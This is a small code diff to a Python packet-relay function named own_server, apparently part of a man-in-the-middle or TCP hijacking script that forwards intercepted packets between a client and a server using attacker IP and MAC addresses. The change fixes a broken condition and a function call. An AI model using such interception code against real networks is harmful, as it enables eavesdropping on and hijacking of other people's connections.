@@ -179,8 +179,8 @@ def own_server(clientIP, serverIP, serverMac, attackerMac, attackerIP):
             forward_to_server(nxt_pkt, attackerMac, attackerIP, serverMac, serverIP)
             if (is_rst(nxt_pkt) or is_tcp_fin(nxt_pkt)):
                 return
-        if (nxt_pkt[sc.IP].src == serverIP, attackerMac, attackerIP, serverMac, serverIP):
-            forward_to_client(nxt_pkt)
+        if (nxt_pkt[sc.IP].src == serverIP):
+            forward_to_client(nxt_pkt, attackerMac, attackerIP, serverMac, serverIP)
             if (is_rst(nxt_pkt) or is_tcp_fin(nxt_pkt)):
                 return
 
